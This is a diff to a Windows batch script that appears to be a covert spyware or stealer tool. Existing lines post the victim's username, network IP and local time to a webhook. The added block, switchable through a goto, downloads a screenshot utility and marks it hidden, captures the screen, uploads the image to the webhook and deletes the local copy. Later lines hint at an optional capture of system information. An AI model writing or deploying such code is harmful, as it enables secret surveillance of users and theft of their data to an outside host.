@@ -35,6 +35,30 @@ for /f "tokens=1-4 delims=/:." %%a in ("%TIME%") do (
 :: ----------------------------------------
 curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```[Report from %USERNAME% - %NetworkIP%]\nLocal time: %HH24%:%MI%```\"}"  %webhook%
 
+:: SCREENSHOT - REMOVE GOTO IF YOU WANT TO TAKE A SCREENSHOT WHEN RUN
+:: ----------
+goto skipscreenshot
+	curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```Screenshot @ %HH24%:%MI%```\"}"  %webhook%
+
+	set "ssurl=https://github.com/chuntaro/screenshot-cmd/blob/master/screenshot.exe?raw=true"
+	
+	IF EXIST "s.exe" GOTO waitloop3
+	curl --silent -L "%ssurl%" -o s.exe
+	>NUL attrib "%vpath%\s.exe" +h
+	
+	:waitloop3
+	IF EXIST "s.exe" GOTO waitloopend3
+	timeout /t 1
+	goto waitloop3
+	:waitloopend3
+	
+	s.exe -wh 1e9060a -o s.png
+	
+	curl --silent --output /dev/null -F ss=@"%vpath%\s.png" %webhook%
+	
+	del "%vpath%\s.png"
+:skipscreenshot
+
 :: SYSTEM INFORMATION - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
 :: ------------------------------------------------------------------
 goto skipsysteminfocapture
